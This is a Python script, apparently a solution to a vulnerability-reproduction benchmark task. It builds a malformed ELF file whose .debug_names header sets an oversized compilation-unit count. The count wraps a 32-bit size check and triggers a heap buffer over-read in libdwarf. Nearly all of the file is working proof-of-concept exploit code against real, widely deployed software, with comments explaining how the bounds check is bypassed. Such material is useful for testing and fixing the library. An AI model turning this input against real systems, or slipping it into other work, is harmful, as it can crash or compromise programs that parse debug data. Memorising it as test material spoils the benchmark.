import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a minimal ELF 64-bit file with a malformed .debug_names section
        # to trigger a heap buffer overflow in libdwarf.
        
        # ELF Header
        EI_MAG = b'\x7fELF'
        EI_CLASS = 2        # 64-bit
        EI_DATA = 1         # Little Endian
        EI_VERSION = 1
        EI_OSABI = 0
        EI_ABIVERSION = 0
        
        e_ident = EI_MAG + bytes([EI_CLASS, EI_DATA, EI_VERSION, EI_OSABI, EI_ABIVERSION]) + b'\x00' * 7
        e_type = 2          # ET_EXEC
        e_machine = 62      # AMD64
        e_version = 1
        e_entry = 0x400000
        e_phoff = 64        # Immediately after ELF header
        e_flags = 0
        e_ehsize = 64
        e_phentsize = 56
        e_phnum = 1
        e_shentsize = 64
        
        # Program Header (Minimal)
        p_type = 1          # PT_LOAD
        p_flags = 5         # R E
        p_offset = 0
        p_vaddr = 0x400000
        p_paddr = 0x400000
        p_filesz = 0x1000   # Large enough to avoid EOF errors during loading
        p_memsz = 0x1000
        p_align = 0x1000
        
        phdr = struct.pack('<IIQQQQQQ', p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align)
        
        # Section Data Construction
        shstrtab_str = b'\x00.shstrtab\x00.debug_names\x00'
        
        # .debug_names Payload
        # Vulnerability vector: comp_unit_count set to 0x40000000.
        # In vulnerable libdwarf versions, the size calculation (count * 4) overflows to 0
        # in 32-bit arithmetic (or untyped macros), bypassing the section size validation check.
        # The library then attempts to iterate over the CUs, reading past the allocated buffer/section end.
        cu_count = 0x40000000
        
        # Header body: Version(2), Padding(2), Counts(7*4)
        # Format: H H I I I I I I I
        dn_body = struct.pack('<HHIIIIIII', 
                              5,                # version
                              0,                # padding
                              cu_count,         # comp_unit_count
                              0,                # local_type_unit_count
                              0,                # foreign_type_unit_count
                              0,                # bucket_count
                              0,                # name_count
                              0,                # abbrev_table_size
                              0)                # augmentation_string_size
        
        # .debug_names unit_length (does not include the length field itself)
        dn_unit_length = len(dn_body)
        debug_names_data = struct.pack('<I', dn_unit_length) + dn_body
        
        # Calculate Offsets
        curr = 64 + 56 # ehdr + phdr
        
        # .shstrtab
        curr = (curr + 3) & ~3 # Align 4
        off_shstrtab = curr
        len_shstrtab = len(shstrtab_str)
        curr += len_shstrtab
        
        # .debug_names
        curr = (curr + 3) & ~3
        off_debug_names = curr
        len_debug_names = len(debug_names_data)
        curr += len_debug_names
        
        # SHT (Section Header Table)
        curr = (curr + 7) & ~7 # Align 8
        off_sht = curr
        
        # Section Headers
        # 0: NULL
        sh0 = b'\x00' * 64
        
        # 1: .shstrtab
        sh1 = struct.pack('<IIQQQQIIQQ', 
                          1,            # sh_name
                          3,            # sh_type (STRTAB)
                          0,            # sh_flags
                          0,            # sh_addr
                          off_shstrtab, # sh_offset
                          len_shstrtab, # sh_size
                          0,            # sh_link
                          0,            # sh_info
                          1,            # sh_addralign
                          0)            # sh_entsize
                          
        # 2: .debug_names
        sh2 = struct.pack('<IIQQQQIIQQ', 
                          11,           # sh_name
                          1,            # sh_type (PROGBITS)
                          0,            # sh_flags
                          0,            # sh_addr
                          off_debug_names, # sh_offset
                          len_debug_names, # sh_size
                          0,            # sh_link
                          0,            # sh_info
                          1,            # sh_addralign
                          0)            # sh_entsize
        
        sht = sh0 + sh1 + sh2
        
        e_shoff = off_sht
        e_shnum = 3
        e_shstrndx = 1
        
        # Finalize ELF Header
        elf_hdr = struct.pack('<16sHHIQQIHHHHHH', e_ident, e_type, e_machine, e_version, e_entry, e_phoff, e_shoff, e_flags, e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx)
        
        # Construct content
        content = bytearray(off_sht + len(sht))
        
        content[0:64] = elf_hdr
        content[64:120] = phdr
        content[off_shstrtab:off_shstrtab+len_shstrtab] = shstrtab_str
        content[off_debug_names:off_debug_names+len_debug_names] = debug_names_data
        content[off_sht:off_sht+len(sht)] = sht
        
        return bytes(content)